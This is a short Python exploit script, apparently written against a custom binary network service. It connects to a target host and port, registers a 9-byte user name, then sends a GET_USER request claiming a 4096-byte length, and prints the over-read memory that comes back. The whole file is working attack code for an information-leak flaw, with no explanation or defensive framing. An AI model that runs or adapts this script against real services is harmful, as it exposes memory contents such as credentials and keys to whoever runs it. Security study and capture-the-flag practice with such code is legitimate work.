#!/usr/bin/env python3
import socket, struct, sys

HOST = sys.argv[1]
PORT = int(sys.argv[2])

def recvn(s,n):
    buf=b''
    while len(buf)<n:
        chunk=s.recv(n-len(buf))
        if not chunk: break
        buf+=chunk
    return buf

s=socket.socket()
s.connect((HOST,PORT))
print("Greeting:",recvn(s,1))

# SET_USER attacker
name=b"A"*8+b"\x00"
s.send(struct.pack("<BH",0,len(name))+name)
print("Ack1:",recvn(s,1))
print("Echo:",recvn(s,len(name)))

# GET_USER small leak
leak_len=4096
s.send(struct.pack("<BH",1, leak_len))
print("Ack2:",recvn(s,1))
dump=recvn(s, leak_len)
print("First 128 bytes:", dump)
